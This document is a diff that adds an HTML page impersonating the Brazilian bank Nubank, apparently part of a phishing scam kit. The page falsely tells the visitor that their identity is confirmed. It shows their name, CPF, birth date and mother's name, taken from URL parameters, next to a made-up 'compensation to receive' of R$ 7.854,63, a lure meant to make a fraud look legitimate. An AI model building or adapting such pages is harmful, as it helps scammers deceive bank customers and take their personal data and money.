@@ -1,0 +1,154 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <title>Sistema de Verificação - Nubank</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      padding: 0rem 1rem;
+    }
+
+    .container {
+      max-width: 400px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .logo {
+      display: flex;
+      justify-content: center;
+      width: 100%;
+    }
+
+    .logo img {
+      max-width: 6rem;
+      height: auto;
+      display: block;
+    }
+
+    /* Linha separadora roxa */
+    .separator {
+      border: none;
+      border-top: 2px solid #830AD1;
+      width: 100%;
+      margin: 1rem 0;
+    }
+
+    .main-card {
+      font-size: 14px;
+      background-color: #F4F4F4;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      width: 100%;
+      text-align: center;
+      border-radius: 6px;
+      line-height: 1.4rem;
+    }
+
+    /* Cards de informação */
+    .info-card {
+      background-color: #F4F4F4;
+      padding: 0.75rem 1rem;
+      margin-bottom: 0.5rem;
+      width: 100%;
+      border-radius: 6px;
+    }
+
+    .info-card-title {
+      font-size: 0.9rem;
+      color: #333;
+      margin-bottom: 0.25rem;
+      font-weight: lighter;
+    }
+
+    .info-card-value {
+      font-size: 1rem;
+      color: #333;
+      font-weight: bold;
+    }
+
+    /* Texto do rodapé */
+    .footer-text {
+      text-align: center;
+      color: #333;
+      font-size: 1rem;
+      line-height: 1.3rem;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="images/nu.svg" alt="Logo">
+    </div>
+    
+    <hr class="separator">
+
+    <div class="main-card">
+      Sua identidade foi confirmada com sucesso!
+      Confira abaixo as informações cadastradas.
+    </div>
+
+    <!-- Infos -->
+    <div class="info-card">
+      <div class="info-card-title">Nome completo</div>
+      <div class="info-card-value" id="fullNameValue"></div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-title">CPF</div>
+      <div class="info-card-value" id="cpfValue"></div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-title">Data de Nascimento</div>
+      <div class="info-card-value" id="birthDateValue"></div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-title">Nome da Mãe</div>
+      <div class="info-card-value" id="motherNameValue"></div>
+    </div>
+
+    <div class="info-card">
+      <div class="info-card-title">Indenização a receber</div>
+      <div class="info-card-value">R$ 7.854,63</div>
+    </div>
+
+    <hr class="separator">
+
+    <div class="footer-text">
+      Sistema de Verificação - Nubank<br>
+      <span id="stateValue"></span>
+    </div>
+  </div>
+
+  <script>
+    // Pega os valores passados por searchParams
+    const params = new URLSearchParams(window.location.search);
+
+    // Atribui valores aos elementos (vazio se não houver, exceto para o estado)
+    const fullNameValue   = params.get('name')   || '';
+    const cpfValue        = params.get('cpf')        || '';
+    const birthDateValue  = params.get('birthDate')  || '';
+    const motherNameValue = params.get('motherName') || '';
+    const stateValue      = params.get('state')      || 'Santa Catarina';
+
+    document.getElementById('fullNameValue').textContent   = fullNameValue;
+    document.getElementById('cpfValue').textContent        = cpfValue;
+    document.getElementById('birthDateValue').textContent  = birthDateValue;
+    document.getElementById('motherNameValue').textContent = motherNameValue;
+    document.getElementById('stateValue').textContent      = stateValue;
+  </script>
+
+</body></html>
